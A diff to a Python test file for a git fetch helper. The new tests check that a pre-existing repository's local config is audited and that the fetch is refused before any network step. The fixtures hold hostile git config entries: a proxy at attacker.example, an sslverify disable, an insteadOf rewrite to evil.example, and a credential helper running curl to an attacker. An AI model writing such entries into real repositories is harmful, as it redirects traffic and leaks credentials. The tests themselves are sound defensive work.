@@ -240,10 +240,13 @@ def test_fetch_into_existing_repo_skips_init(tmp_path: Path) -> None:
         fetch_commit(repo, "https://github.com/foo/bar", _VALID_SHA)
 
     cmds = [_strip_pins(c.args[0]) for c in mock_local.call_args_list]
-    # First local call should be ``remote add``, not ``init`` —
-    # the ``.git`` dir already exists.
-    assert "init" not in cmds[0]
-    assert cmds[0][3] == "remote"
+    # No ``init`` — the ``.git`` dir already exists. The first local
+    # call is the pre-existing-config audit (config --local -z --list),
+    # then ``remote add``.
+    assert not any("init" in c for c in cmds)
+    assert cmds[0][3] == "config"
+    assert "--local" in cmds[0]
+    assert cmds[1][3] == "remote"
 
 
 def test_fetch_existing_origin_remote_falls_back_to_set_url(
@@ -1139,3 +1142,141 @@ def test_writable_path_ordinary_tmp_dir_accepted(tmp_path: Path) -> None:
     from core.git.clone import _validate_writable_path
 
     _validate_writable_path(tmp_path / "clone-target", role="output")
+
+
+# ---------------------------------------------------------------------------
+# fetch_commit pre-existing-config audit
+# ---------------------------------------------------------------------------
+
+def test_foreign_local_config_keys_detects_transport_class() -> None:
+    """Every member of the unpinnable transport class must surface:
+    proxy keys, URL-scoped http keys, insteadOf rewrites, URL-scoped
+    credential helpers, per-remote proxy/vcs."""
+    from core.git.clone import _foreign_local_config_keys
+    listing = "\0".join([
+        "http.proxy\nhttp://attacker.example:8080",
+        "http.https://github.com/.sslverify\nfalse",
+        "url.https://evil.example/.insteadof\nhttps://github.com/",
+        "credential.https://github.com.helper\n!curl attacker",
+        "remote.origin.proxy\nhttp://attacker.example:8080",
+        "remote.origin.vcs\next",
+        "core.repositoryformatversion\n0",       # benign — must NOT surface
+        "remote.origin.url\nhttps://github.com/foo/bar",  # benign
+    ]) + "\0"
+    foreign = _foreign_local_config_keys(listing)
+    assert "http.proxy" in foreign
+    assert "http.https://github.com/.sslverify" in foreign
+    assert "url.https://evil.example/.insteadof" in foreign
+    assert "credential.https://github.com.helper" in foreign
+    assert "remote.origin.proxy" in foreign
+    assert "remote.origin.vcs" in foreign
+    assert "core.repositoryformatversion" not in foreign
+    assert "remote.origin.url" not in foreign
+
+
+def test_foreign_local_config_keys_passes_own_footprint() -> None:
+    """The exact key set fetch_commit's init + remote-add steps write
+    (including the platform-dependent init defaults) audits clean."""
+    from core.git.clone import _foreign_local_config_keys
+    listing = "\0".join([
+        "core.repositoryformatversion\n0",
+        "core.filemode\ntrue",
+        "core.bare\nfalse",
+        "core.logallrefupdates\ntrue",
+        "core.ignorecase\ntrue",
+        "core.precomposeunicode\ntrue",
+        "core.symlinks\nfalse",
+        "remote.origin.url\nhttps://github.com/foo/bar",
+        "remote.origin.fetch\n+refs/heads/*:refs/remotes/origin/*",
+    ]) + "\0"
+    assert _foreign_local_config_keys(listing) == []
+
+
+def test_foreign_local_config_keys_nul_framing_defeats_value_injection() -> None:
+    """A hostile VALUE containing key-looking lines stays one NUL-framed
+    entry — it can neither forge a benign entry nor hide a hostile key
+    (line-wise parsing of the non-``-z`` form could be steered)."""
+    from core.git.clone import _foreign_local_config_keys
+    # Benign key whose value embeds what LOOKS like a hostile key line:
+    # stays benign (it is one entry; the audit reads only the key).
+    listing = "remote.origin.url\nhttps://x\nhttp.proxy=evil\0"
+    assert _foreign_local_config_keys(listing) == []
+    # The hostile key as its OWN entry is always caught.
+    listing = (
+        "remote.origin.url\nhttps://x\0"
+        "http.proxy\nhttp://attacker.example:8080\0"
+    )
+    assert _foreign_local_config_keys(listing) == ["http.proxy"]
+
+
+def test_fetch_preexisting_repo_hostile_config_refused(tmp_path: Path) -> None:
+    """A pre-existing repo_dir whose local config carries transport-
+    altering keys (insteadOf redirect + attacker proxy) must refuse
+    BEFORE the network step — no finite ``-c`` pin list covers the
+    URL-scoped key class, so the fetch never runs over it."""
+    repo = tmp_path / "repo"
+    (repo / ".git").mkdir(parents=True)
+    hostile = (
+        "url.https://evil.example/.insteadof\nhttps://github.com/\0"
+        "http.proxy\nhttp://attacker.example:8080\0"
+    )
+
+    def _side_effect(cmd, **kwargs):
+        if "config" in cmd:
+            return _completed(0, stdout=hostile)
+        return _local_ok(cmd, **kwargs)
+
+    with patch("core.sandbox.run_untrusted", side_effect=_side_effect), \
+         patch("core.sandbox.run_untrusted_networked") as mock_net:
+        with pytest.raises(RuntimeError, match="never writes"):
+            fetch_commit(repo, "https://github.com/foo/bar", _VALID_SHA)
+        mock_net.assert_not_called()
+
+
+def test_fetch_preexisting_repo_unreadable_config_refused(
+    tmp_path: Path,
+) -> None:
+    """Config listing failure = unverifiable configuration → refuse
+    (fail closed), never fetch blind."""
+    repo = tmp_path / "repo"
+    (repo / ".git").mkdir(parents=True)
+
+    def _side_effect(cmd, **kwargs):
+        if "config" in cmd:
+            return _completed(128, stderr="fatal: unable to read config")
+        return _local_ok(cmd, **kwargs)
+
+    with patch("core.sandbox.run_untrusted", side_effect=_side_effect), \
+         patch("core.sandbox.run_untrusted_networked") as mock_net:
+        with pytest.raises(RuntimeError, match="unverifiable"):
+            fetch_commit(repo, "https://github.com/foo/bar", _VALID_SHA)
+        mock_net.assert_not_called()
+
+
+def test_fetch_preexisting_repo_own_footprint_still_fetches(
+    tmp_path: Path,
+) -> None:
+    """Two-direction: a repo_dir whose config is exactly fetch_commit's
+    own footprint (the cve_diff re-fetch loop shape) keeps working."""
+    repo = tmp_path / "repo"
+    (repo / ".git").mkdir(parents=True)
+    own = (
+        "core.repositoryformatversion\n0\0"
+        "core.filemode\ntrue\0"
+        "core.bare\nfalse\0"
+        "core.logallrefupdates\ntrue\0"
+        "remote.origin.url\nhttps://github.com/foo/bar\0"
+        "remote.origin.fetch\n+refs/heads/*:refs/remotes/origin/*\0"
+    )
+
+    def _side_effect(cmd, **kwargs):
+        if "config" in cmd:
+            return _completed(0, stdout=own)
+        return _local_ok(cmd, **kwargs)
+
+    with patch("core.sandbox.run_untrusted", side_effect=_side_effect), \
+         patch("core.sandbox.run_untrusted_networked") as mock_net:
+        mock_net.return_value = _completed(0)
+        ok = fetch_commit(repo, "https://github.com/foo/bar", _VALID_SHA)
+        assert ok is True
+        assert mock_net.called
